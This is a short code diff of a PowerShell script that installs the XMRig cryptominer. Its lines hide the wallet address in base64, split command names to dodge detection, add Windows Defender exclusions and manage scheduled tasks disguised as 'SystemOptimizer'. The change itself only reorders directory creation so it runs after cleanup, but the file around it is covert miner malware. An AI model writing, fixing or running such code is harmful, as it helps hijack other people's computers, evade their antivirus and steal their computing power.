@@ -15,9 +15,6 @@ $zipPath = "$baseDir\xmrig.zip"
 $w1 = "NDM1c3dVRThodGI5NnhNd1dYYmZuekNYQ2tpS1dRaGNWS3BRempBSHdOTWtpV3hQbnpKaWFpSDgydWNwdm5mZ3BlYkJKOVFNanlWV25GZEY2aWg0MkxWTEpZNTg3d3Y="
 $wallet = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($w1))
 
-# ===== CREATE DIR =====
-New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
-
 # ===== DEFENDER EXCLUSIONS FIRST =====
 try {
     & ('Add-Mp'+'Preference') -ExclusionPath "$baseDir" -ErrorAction SilentlyContinue
@@ -36,6 +33,9 @@ Remove-Item -Recurse -Force "$baseDir" 2>$null
 & ('sch'+'tasks') /Delete /TN "SystemOptimizer-Logon" /F 2>$null
 & ('sch'+'tasks') /Delete /TN "ModestFermi_XMRig" /F 2>$null
 Start-Sleep 1
+
+# ===== CREATE DIR (after cleanup) =====
+New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
 
 # ===== DOWNLOAD XMRIG (NO WINRING0) =====
 if (-not (Test-Path $xmrigExe)) {
